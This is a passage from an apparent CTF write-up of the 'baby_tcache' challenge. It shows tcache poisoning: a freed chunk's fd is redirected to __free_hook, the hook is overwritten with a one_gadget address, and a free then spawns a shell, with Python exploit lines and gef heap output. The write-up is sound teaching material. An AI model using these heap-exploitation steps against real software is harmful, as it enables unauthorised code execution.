$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. New heap           $
$   2. Delete heap        $ 
$   3. Exit               $ 
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: $  


```

Now, from this point we will just overwrite the `fd` of a `free`'d tcache chunk with our target address such that during next allocation, depending on the size will return the target via `malloc` allowing us to overwrite it. Given the heap condition as of now, when we look at the available bins, we see:-

```r
gef➤  heap bins
────────────────────────────────── Tcachebins for arena 0x7fe15febfc40 ──────────────────────────────────
Tcachebins[idx=0, size=0x20] count=1  ←  Chunk(addr=0x55ab342e0810, size=0x7fe15febfca0, flags=) 
Tcachebins[idx=5, size=0x70] count=255  ←  [Corrupted chunk at 0xfbad2887]
─────────────────────────────────── Fastbins for arena 0x7fe15febfc40 ───────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
────────────────────────────────── Unsorted Bin for arena 'main_arena' ──────────────────────────────────
[+] unsorted_bins[0]: fw=0x55ab342e07f0, bk=0x55ab342e07f0
 →   Chunk(addr=0x55ab342e0800, size=0x530, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
```

If you pay close attention, the chunk of the `unsorted` bin is pointing to the address `0x55.....0800` and at the same time the `tcache bin[0]`'s chunk point to the `0x55....0810`, this proposed the idea of allocating a chunk of a size which will return the exact chunk pointed by the `unsorted` bin, that way we will be able to overwrite the `fd` of the `tcache` chunk `0x55......0810`.

```py
add(0x400,p64(0x00)*2 +p64(free_hook))
```

Doing that so, this will overwrite the `fd` of the chunk `0x55...810` to the address of the `free_hook`, for which we can get it in next allocation-

```r
gef➤  heap bins tcache
────────────────────────────────── Tcachebins for arena 0x7fe15febfc40 ──────────────────────────────────
Tcachebins[idx=0, size=0x20] count=1  ←  Chunk(addr=0x55ab342e0810, size=0x0, flags=)  ←  Chunk(addr=0x7fe15fec18e8, size=0x0, flags=) 
Tcachebins[idx=5, size=0x70] count=255  ←  [Corrupted chunk at 0xfbad2887]

gef➤  p &__free_hook 
$60 = (void (**)(void *, const void *)) 0x7fe15fec18e8 <__free_hook>

```

We successfully overwritten the chunk `0x55..810`'s `fd` to the address of the `free_hook`, now we will just do two allocations, one will return the chunk `0x55..810` and the other one will give us the target i.e. `__free_hook`.

```py
add(0x10,"a")   # Gives the chunk 0x55....810
add(0x10,p64(one_gadget),1)  # Gives the __free_hook address and result in being overwritten with the one_gadget address
``` 
Given this, it'll result in the `__free_hook` being overwritten with the `one_gadget` address:-


```r
gef➤  x/xg &__free_hook 
0x7fa27c4e18e8 <__free_hook>:	0x00007fa27c143432
```
Great, we successfully overwrote the `__free_hook` address, now we will just do `free(0)` which will just result in the `one_gadget` being called, spawning a shell:-

```py
free(0)
```

Now, we get a shell:-

```r
[+] Starting local process './baby_tcache': pid 6009
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 0x7fa27c0f4000
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ whoami
vagrant
$ ls 
baby_tcache     children_tcache.i64  house_of_einherjar.c
baby_tcache.i64  children_tcache.py   libc.so.6
baby_tcache.py     core              overlapping_chunks
children_tcache  house_of_einherjar   overlapping_chunks.c
$  
```

This was it, although this could be more explainative if we go in-depth about the `_IO_2_1_stdout_` part, for that, I saved the analysis to later on. Now, that was that, have fun pwning.